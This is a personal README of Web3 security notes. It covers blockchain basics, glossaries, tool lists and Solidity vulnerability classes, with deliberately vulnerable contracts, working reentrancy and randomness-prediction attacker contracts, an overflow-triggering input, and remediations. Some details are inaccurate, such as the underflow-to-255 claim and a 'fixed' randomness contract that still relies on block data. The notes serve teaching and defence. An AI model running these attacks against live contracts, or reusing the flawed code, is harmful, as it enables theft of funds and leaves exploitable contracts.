```solidity
 _       __     __   _____                              _ __                       __           
| |     / /__  / /_ |__  /   ________  _______  _______(_) /___  __   ____  ____  / /____  _____
| | /| / / _ \/ __ \ /_ <   / ___/ _ \/ ___/ / / / ___/ / __/ / / /  / __ \/ __ \/ __/ _ \/ ___/
| |/ |/ /  __/ /_/ /__/ /  (__  )  __/ /__/ /_/ / /  / / /_/ /_/ /  / / / / /_/ / /_/  __(__  ) 
|__/|__/\___/_.___/____/  /____/\___/\___/\__,_/_/  /_/\__/\__, /  /_/ /_/\____/\__/\___/____/  
                                                          /____/                                
```
![eth](https://img.shields.io/badge/ETH-riccardomalatesta.eth-blue)
![Twitter](https://img.shields.io/twitter/follow/seeu_inspace?style=social)

Personal notes about Web3 from a hacker's perspective. Here I gather all the resources about Web3's insecurity.

## Index

- [Introduction](#introduction)
- [Development](https://github.com/seeu-inspace/reference-web3-security/tree/main/development)
- [Resources](#resources)
- [Tools](#tools)
- [Vulnerabilities](#vulnerabilities)
  - [Integer Overflow / Underflow](#integer-overflow--underflow)
  - [Reentrancy Vulnerabilities](#reentrancy-vulnerabilities)
  - [Authorization issues](#authorization-issues)
  - [Use of components with known vulnerabilities](#use-of-components-with-known-vulnerabilities)
  - [Bad Randomness](#bad-randomness)
  - Oracle Manipulation
  - Denial of Service
  - Flash Loan Attacks
  - Unchecked Return Values For Low Level Calls
  - Denial of Service
  - Front-Running
  - Time manipulation
  - Short Address Attack
  - Griefing
  - Deprecated/Historical
  - Force Feeding

## Introduction

The **Blockchain** is a set of technologies in which the ledger is structured as a chain of blocks containing transactions and consensus distributed on all nodes of the network. All nodes can participate in the validation process of transactions to be included in the ledger.

There are two common types of operations that are carried out to create a cryptocurrency:
- **Mining (Proof-of-Work)** Validation of transactions through the resolution of mathematical problems by miners who use hardware and software dedicated to these operations. Whoever solves the problem first wins the right to add a new block of transactions and a reward;
- **Staking (Proof-of-Staking)** consists of users who lock their tokens in a node called a validator. The validators take turns checking the transactions on the network. If they perform well, they receive a prize distributed among all the participants of the validator, otherwise, they receive a penalty.
- Read also ["What Is the Difference Between Blockchain Consensus Algorithms?" by Pixelplex](https://pixelplex.io/blog/best-blockchain-consensus-algorithms/)

**Ethereum** is a blockchain that has popularized an incredible innovation: smart contracts, which are a program or collection of code and data that reside and function in a specific address on the network. Thanks to this factor, it is defined as a "programmable blockchain".

Note: By design, smart contracts are immutable.  This means that once a Smart Contract is deployed, it cannot be modified, with the exception of the [Proxy Upgrade Pattern](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies).

A token can be created with a smart contract. Most of them reside in the ERC20 category, which is fungible tokens. Other tokens are ERC-721 and ERC-1155, aka NFTs.

A **decentralized application**, also known as **DApp**, differs from other applications in that, instead of relying on a server, it uses blockchain technology. To fully interact with a DApp you need a wallet.
DApps are developed both with a user-friendly interface, such as a web, mobile or even desktop app, and with a smart contract on the blockchain. 

The fact that there is a user-friendly interface means that the "old vulnerabilities" can still be found. An example: If a DApp has a web interface, maybe an [XSS](https://owasp.org/www-community/attacks/xss/) on it can be found and exploited. Another evergreen is phishing, that is frequently used to steal tokens and NFTs.

The source code of the Smart Contracts is often written in **Solidity**, an object-oriented programming language. Another widely used programming language, but less than Solidity, is **Vyper** (Python).

Most of the time the smart contract code is found public in a github such as `github.com/org/project/contracts/*.sol` or you can get it from Etherscan, for example by going to the contract address (such as that of the DAI token), in the Contract tab you will find the code https://etherscan.io/address/0x6b175474e89094c44da98b954eedeac495271d0f#code and contract ABI > a json which indicates how the functions of the smart contract are called.
In any case, the source is almost always public. If it's not public, you can use an EVM bytecode decompiler such as https://etherscan.io/bytecode-decompiler, just enter the contract address here.

[Bitcoin whitepaper](https://bitcoin.org/bitcoin.pdf) | [Ethereum whitepaper](https://ethereum.org/en/whitepaper/)

#### Web3 glossary

- **Decentralized Autonomous Organization (DAO)** A blockchain-based organization that is structured by self-enforcing smart contracts and democratically run by its users using open-source code. A vote is taken by network stakeholders on every decision.

- **Liquidity** The capacity to swap an asset without significantly changing its price and the simplicity with which an asset may be turned into cash are both examples of liquidity.

- **Oracle** A blockchain protocol receives external real-world data from Oracles, third-party information service providers. This implies that they can increase the security, veracity, and strength of the data that a blockchain network receives and make use of.

You can find more here: [Crypto Glossary | Cryptopedia](https://www.gemini.com/cryptopedia/glossary)

#### Ethereum glossary

- **application binary interface (ABI)** The standard way to interact with contracts in the Ethereum ecosystem, both from outside the blockchain and for contract-to-contract interactions.

- **bytecode** An abstract instruction set designed for efficient execution by a software interpreter or a virtual machine. Unlike human-readable source code, bytecode is expressed in numeric format.

- **Ethereum Improvement Proposal (EIP)** A design document providing information to the Ethereum community, describing a proposed new feature or its processes or environment.

- **Ethereum Request for Comments (ERC)** A label given to some EIPs that attempt to define a specific standard of Ethereum usage.

- **Ethereum Virtual Machine (EVM)** is a complex, dedicated software virtual stack that executes contract bytecode and is integrated into each entire Ethereum node. Simply said, EVM is a software framework that allows developers to construct Ethereum-based decentralized applications (DApps).

- **hard fork** A permanent divergence in the blockchain; also known as a hard-forking change. One commonly occurs when nonupgraded nodes can't validate blocks created by upgraded nodes that follow newer consensus rules. Not to be confused with a fork, soft fork, software fork, or Git fork.

- **wei** The smallest denomination of ether. 10<sup>18</sup> wei = 1 ether.

You can find more here: [ethereum.org/en/glossary/](https://ethereum.org/en/glossary/)

#### Personal security

- Store your assets in a **cold wallet** (hardware wallet) instead of a hot wallet (Centralized exchanges or CEXs). Some good examples are [Ledger](https://www.ledger.com/) and [Trezor](https://trezor.io/);
- Keep your **seedphrase** in a safe place and don't share it with anyone. If possible, use a solution like [Zeus from Cryptotag](https://cryptotag.io/products/zeus-starter-kit/);
- Also follow Web2 rules, like being aware of phishing.


## Resources

**Smart contract weakness classification**<br/>
- [SWC Registry](https://swcregistry.io/)
- [Smart Contract Security Verification Standard](https://securing.github.io/SCSVS/)

**Public security audits** <br/> 
- [OpenZeppelin's public security audits](https://blog.openzeppelin.com/security-audits/)
- [Halborn's public security audits](https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity%20Smart%20Contract%20Audits)
- [code4rena Audit Reports](https://code4rena.com/reports/)
- [Web3 Security Library | Bugfix Reviews](https://github.com/immunefi-team/Web3-Security-Library/blob/main/BugFixReviews/README.md)
- [Audit Hero findings](https://audit-hero.com/search-findings)

**Rekt updates** To stay up-to-date with the latest crypto hacks <br/> 
- [rekt.news](https://rekt.news/)
- [DeFi Hacks Analysis - Root Cause](https://wooded-meter-1d8.notion.site/0e85e02c5ed34df3855ea9f3ca40f53b?v=22e5e2c506ef4caeb40b4f78e23517ee)

**Blogs** <br/> 
- [Immunefi's blog](https://immunefi.medium.com/)
- [OpenZeppelin's blog](https://blog.openzeppelin.com/)
- [Halborn's blog](https://halborn.com/blog/)
- [SlowMist's blog](https://slowmist.medium.com/)
- [PWNING](https://pwning.mirror.xyz/)

**Newsletters**
- [The Daily Gwei](https://thedailygwei.substack.com/)
- [Blockchain Threat Intelligence](https://newsletter.blockthreat.io/)
- [Week in Ethereum News](https://weekinethereumnews.com/)

**Other resources**<br/>
- [Web3 Security Library](https://github.com/immunefi-team/Web3-Security-Library)
- [Simple Security Toolkit](https://github.com/nascentxyz/simple-security-toolkit)
- [Non-EVM blockchains](https://defillama.com/chains/Non-EVM)
- [Awesome Ethereum Security](https://github.com/crytic/awesome-ethereum-security)
- [Secureum](https://www.youtube.com/c/SecureumVideos)


## Tools

**Blockchain exploration**
- [Metamask](https://metamask.io/)
- [Etherscan.io](https://etherscan.io)
- [EVM Codes](https://www.evm.codes/)
- [BSCscan.com](https://bscscan.com/)
- [Polygonscan](https://polygonscan.com/)
- [Bitquery](https://explorer.bitquery.io/)

**Development Environment**
- [Remix](https://remix.ethereum.org)
- [Hardhat](https://hardhat.org/hardhat-runner/docs/getting-started#installation)
- [Brownie](https://eth-brownie.readthedocs.io/en/stable/)
- [Foundry](https://github.com/foundry-rs/foundry)
- [Truffle Suite](https://trufflesuite.com/docs/)
  - [Truffle](https://trufflesuite.com/docs/truffle/)
  - [Ganache](https://trufflesuite.com/ganache/)
  - [Drizzle](https://trufflesuite.com/docs/drizzle/)
  - [Truffle for VSCode](https://trufflesuite.com/docs/vscode-ext/)
- [Infura.io](https://infuria.io)
- [Substrate](https://substrate.io/)

**Visualization**
- [Solgraph](https://github.com/raineorshine/solgraph)
- [Solidity Function Profiler](https://github.com/EricR/sol-function-profiler)
- [Sūrya](https://github.com/ConsenSys/surya)

**Automatic scan/fuzz**
- [Mythril](https://mythril-classic.readthedocs.io/en/master/)
- [MythX](https://mythx.io/)
- [Manticore](https://github.com/trailofbits/manticore)
- [Slither](https://github.com/crytic/slither)
- [Securify](https://github.com/eth-sri/securify2)
- [Echidna](https://github.com/crytic/echidna)
- [ERC20 Verifier](https://erc20-verifier.openzeppelin.com/)

**Others**
- [ZIION](https://docs.ziion.org/)
- [OpenZeppelin contracts](https://github.com/OpenZeppelin/openzeppelin-contracts)
- [Ethereum Unit Converter](https://eth-converter.com/)
- [Faucet Link](https://faucetlink.to/)
- [abi-decompiler](https://github.com/Decurity/abi-decompiler)

**<ins>[web3.js](https://web3js.readthedocs.io/en/v1.7.5/)</ins>**

web3.js is very useful for interacting with a smart contract and its APIs. Install it by using the command `npm install web3`.

To use it in Node.js and interact with a contract, use the following commands:

```javascript
- node;
- const Web3 = require('web3');
- const URL = "http://localhost:8545"; //This is the URL where the contract is deployed, insert the url from Infura.io or Ganache
- const web3 = new Web3(URL);
- accounts = web3.eth.getAccounts();
- var account;
- accounts.then((v) => {(this.account = v[1])});
- const address = "<CONTRACT_ADDRESS>"; //Copy and paste the Contract Address
- const abi = "<ABI>"; //Copy and paste the ABI of the Smart Contract
- const contract = new web3.eth.Contract(abi, address).
```

## Vulnerabilities

### <ins>Integer Overflow / Underflow</ins>

**Integer Overflow** happens because the arithmetic value of the operation exceeds the maximum size of the variable value type. An example: the variable `amount` is `uint256`. It supports numeric values from 0 to 2<sup>256</sup>. This means that a value like `0x8000000000000000000000000000000000000000000000000000000000000000` corresponding to the decimal value `57896044618658097711785492504343953926634992332820282019728792003956564819968` received in the input for the variable `amount` would trigger a Integer Overflow since it exceeds the maximum value supported.

A real example of this attack: Beauty Chain exploit https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f. Beauty Chain smart contract code: https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code.

The function vulnerable to a Batch Overflow on Beauty Chain is `batchTransfer`.

```solidity
//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.6;

contract BEC_Target{

mapping(address => uint) balances;

function batchTransfer(address[] memory _receivers, uint256 _value) public payable returns (bool) {
    uint cnt = _receivers.length;
    uint256 amount = uint256(cnt) * _value;
    require(cnt > 0 && cnt <= 20);
    require(_value > 0 && balances[msg.sender] >= amount);

    balances[msg.sender] = balances[msg.sender] - amount;
    for (uint i = 0; i < cnt; i++) {
        balances[_receivers[i]] = balances[_receivers[i]] + _value;
    }
    return true;
  }

    function deposit() public payable{
        balances[msg.sender] += msg.value;       
    }

    function getBalance() public view returns(uint){
        return balances[msg.sender];
    }

}
```

An input like `["<ADDR_1>","<ADDR_2>"], 0x8000000000000000000000000000000000000000000000000000000000000000` for the function `batchTransfer` would trigger this vulnerability.

**Integer Underflow** happens in the exact opposite of the overflow error. It error occurs when you go below the minimum amount. This triggers the system to bring you right back up to maximum value instead of reverting to zero.

For example, injecting the value `-1` in a `uint256` variable that stores the value `0` will result in the number 255.

#### Remediation

**Note**: Since version 0.8.0 Solidity automatically reverts on integer overflow and underflow instead of circling the value back to zero.

As seen previously, the problem lies in the variable `amount` which, having no input controls, is subject to a Integer Overflow/Underflow. The solution to this problem is to implement a check on the value received as an input. An example is the following:

```solidity
if (a == 0) return (true, 0);
uint256 c = a * b;
if (c / a != b) return (false, 0);
return (true, c);
```

The variable `uint256 c` is the multiplication of the address of recipient `a` by the value of the number of tokens that must receive `b`, giving the result `c`. To make sure that the value `c` is not Overfloded or Underfloded, we check that the division of `c` / `a` is equal to `b`. If not, it would indicate that the value `c` makes no sense and has been compromised.

To fix this vulnerability, and other integer overflows and underflows, the [SafeMath library by OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts) can be used. SafeMath provides four functions: Add, Subtract, Multiply, Divide. Each of them performs a check on the operation to verify that the data received in input is valid.

Once "[OpenZeppelin contracts](https://github.com/OpenZeppelin/openzeppelin-contracts)" are installed, you can use SafeMath from the library by importing it:

```solidity
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
```

### <ins>Reentrancy Vulnerabilities</ins>

A Reentrancy vulnerability is a type of attack to drain the bit-by-bit liquidity of a contract with an insecure code-writing pattern.

An incorrect flow looks like this:
- It verifies that the user has a sufficient balance to execute the transaction
- Sends the funds to the user
- If the operation is successful, the contract updates the user's balance

The problem arises when a contract invokes this operation instead of a user. This can create code that generates a loop, which means that an attacker can invoke the withdrawal function many times because it is the same balance that is checked as the initial value.

An example:

```solidity
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;
    
contract simpleReentrancy {
	mapping (address => uint) private balances;
	
	function deposit() public payable  {
		require((balances[msg.sender] + msg.value) >= balances[msg.sender]);
		balances[msg.sender] += msg.value;
	}
 
	function withdraw(uint withdrawAmount) public returns (uint) {
		require(withdrawAmount <= balances[msg.sender]);
		msg.sender.call.value(withdrawAmount)("");

		balances[msg.sender] -= withdrawAmount;
		return balances[msg.sender];
	}
    
	function getBalance() public view returns (uint){
		return balances[msg.sender];
	}
}
```

The vulnerable function is `withdraw`. As you can see, first it checks that the balance is sufficient, then the withdrawal is made and only after this step the balance is being updated.

1. An attacker deposits a small amount into his account and calls the withdraw function of the contract by withdrawing an amount less than his balance;
2. The victim contract interacts with the attacker's contract trying to provide the requested funds;
3. The attacker will respond with a fallback function that will call the withdrawal another time, but the victim contract has not yet updated the user's balance so it will keep the initial one despite the previous operation.

An example code of a malicious smart contract is as follows:

```solidity
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

interface targetInterface{
	function deposit() external payable; 
	function withdraw(uint withdrawAmount) external; 
}
 
contract simpleReentrancyAttack{
	targetInterface bankAddress = targetInterface(TARGET_ADDRESS_HERE); 
	uint amount = 1 ether; 
 
	function deposit() public payable{
		bankAddress.deposit.value(amount)();
	}

	function attack() public payable{
		bankAddress.withdraw(amount); 
	}

	function retrieveStolenFunds() public {
		msg.sender.transfer(address(this).balance);
	}

	fallback () external payable{ 
		if (address(bankAddress).balance >= amount){
			bankAddress.withdraw(amount);
		}   
	}
}
```

1. This contract checks that the balance on the smart contract is greater than 1 ETH. Call the external withdraw function of the victim's smart contract, which will provide the requested funds;
2. Not having received further instructions after receiving the funds, the fallback function is triggered immediately. When the latter is activated, the smart contract has not yet updated the attacker's balance, so it will proceed to carry out the withdrawal operation with the previous balance;
3. The malicious smart contract receives the funds and no further instructions, so it repeats the step 2.


#### Remediation

Implement Checks Effects Interactions Pattern: A secure code-writing pattern that prevents an attacker from creating loops that allow him to re-enter the contract multiple times without blocking.

- Verify that the requirements are met before continuing the execution;
- Update balances and make changes before interacting with an external actor;
- Finally, after the transaction has been validated and the changes have been made, interactions with the external entity are allowed.

#### Resources

- [A Historical Collection of Reentrancy Attacks](https://github.com/ethereum/solidity/issues/12996#issuecomment-1187381059)



### <ins>Authorization issues</ins>

A function can be: External, Public, Internal or Private. Defining this aspect is very important as there is a risk of allowing potentially harmful operations or giving administrative privileges to any user.

A first example is the following `withdraw` function. As you can see, it does not check if the user requesting a certain amount has the funds to request the withdrawal.

```solidity
function withdraw(uint amount) public payable {
	msg.sender.transfer(amount);
}
```

Another example is the following `kill()` function. The `kill` function contains the method `selfdestruct` that allows to withdraw all the contract funds in the user's balance which activates the functionality and invalidates the smart contract. Since this function is public, any user can have access to it.

```solidity
function kill() public {
	selfdestruct(msg.sender);
}
```

Here's how problematic this can become:

<img src="https://raw.githubusercontent.com/seeu-inspace/reference-web3-security/main/img/eth-kill-function.png" width="50%" height="50%">


Another example is a function like `initContract()`, a common pattern used to identify the owner of a Smart Contract to grant major privileges. It designates the address which initializes it as the contract's owner, but the problem is that the initialization function can be called by anyone, even after it has already been called.

```solidity
function initContract() public {
	owner = msg.sender;
}
```


#### Remediation

A solution for the first scenario is very simple, it just needs a check to be implemented.

For the second example, you can add the following modifier. In the modifier there is the condition that whoever is carrying out the function must be the owner of the contract.

```solidity
address owner;

modifier OnlyOwner(){
    require(msg.sender == owner);
    
    _;

}
```

So the fixed code would look like this:

```solidity
mapping (address =>uint) balances;
    
address owner;
    
modifier OnlyOwner(){
    require(msg.sender == owner);
    
    _;

}

function kill() public OnlyOwner{
		selfdestruct(msg.sender);
}
```

### <ins>Use of components with known vulnerabilities</ins>

An outdated compiler with known vulnerabilities may have been used to compile the smart contract. Another possibility is that libraries with known vulnerabilities have been imported.

Another problem is code reuse: many programmers reuse code for their applications. This means that if the copied code contains vulnerabilities, the same is true for the application it was pasted into.

### <ins>Bad Randomness</ins>

Weak Randomness arises when the attacker can predict the result of a random number. This can cause some security issues depending on the scenario.

Currently, two techniques are frequently employed to obtain randomness: using **block variables** or **oracles**.

**1. Block variables**

This is how it's composed a block variable:

```solidity
block.basefee(uint)
block.chainid(uint)
block.coinbase()
block.gaslimit(uint)
block.number(uint)
block.timestamp(uint)
blockhash(uint blockNumber) returns (bytes32) 
```

Out of those, the most frequently used variables are `block.difficulty`, `blockhash`, `block.number`, and `block.timestamp`. Randomness generated by block data limits the possibility of regular users to predict that random number, but not to miners.

When they have mined a block, the miners are not required to broadcast it, they can also discard it. This process is called selective packing. Until they achieve the desired outcome, miners will continue to produce randomness; once they do, they will broadcast a block.

For randomness that isn't a part of the core application, block variables are a better option.

**2. Oracles**

An example of an oracle is [ChainLink](https://chain.link/). There are oracles specifically built to generate random number seeds that are then used by other applications to generate randomness.

This comes with some risks, such as being dependent on a third-party to provide you a random number seed and being sure that the oracle doesn't get corrupted. Even if you create your own oracle, your application will always depend on the integrity of it.

That said, oracles are the most reliable way to have strong randomness.

**Example of a vulnerable smart contract**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract GuessRandomNumber { 
	constructor() payable {}
	function guess(uint _guess) public { 
		uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
		if (_guess == answer) { 
			(bool sent, ) = msg.sender.call{value: 1 ether}(""); 
			require(sent, "Transaction failed"); 
		}
	}
}
```

The contract deployer saves the random number in `answer` and creates randomness by using the previous block's block time and hash as the random number seed. So an attacker needs to simulate his random number generation method to be rewarded.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Attacker { 
	receive() external payable {}
	function attack_function(GuessRandomNumber randomn) public { 
		uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
		randomn.guess(answer); 
	}
	function getBalance() public view returns (uint) { 
		return address(this).balance; 
	}
}
```

1. `Attack.attack_function()` simulates how the GuessRandomNumber contract generates random numbers;
2. `randomn.guess()` is called, and a randomly generated number is supplied;
   `.guess()` is executed in the same block where block.number and block.timestamp remain unaltered.. 
3. `Attack.attack_function()` and `randomn.guess()` produce the same results of the Randomness generated by each function, enabling the attacker to bypass the `if(_guess == answer)` condition and get the reward.

#### Remediation

If the random number is associated with a non-core enterprise, you can generate it using the hash of the following block. Otherwise is better to rely on an oracle.

An example of the fixed victim smart contract comes from [SlowMist's blog](https://slowmist.medium.com/introduction-to-smart-contract-security-randomness-792cf8997599#6bf1)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract GuessRandomNumber { 
	constructor() payable {}
	uint256 public deadline = block.timestamp + 72 hours;
	mapping ( address => uint256 ) public Answer;
	modifier isTime(){ 
		require(block.timestamp > deadline , "Not the time!");
        	_;
	}

	event Guess(address,uint256); 
	event Claim(address);

	function guess(uint256 _guess) public { 
		require(block.timestamp <= deadline , "Too late!"); 
		Answer[msg.sender] = _guess; 
        emit Guess(msg.sender, _guess); 
	}

	function claim() public isTime{ 
		uint256 key = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))); 
		uint256 answer = Answer[msg.sender]; 
		require(key == answer , "Sorry, try next time."); 
		(bool sent, ) = msg.sender.call{value: 1 ether}(""); 
		require(sent, "Transaction failed"); 
		emit Claim(msg.sender); 
	}

}
```
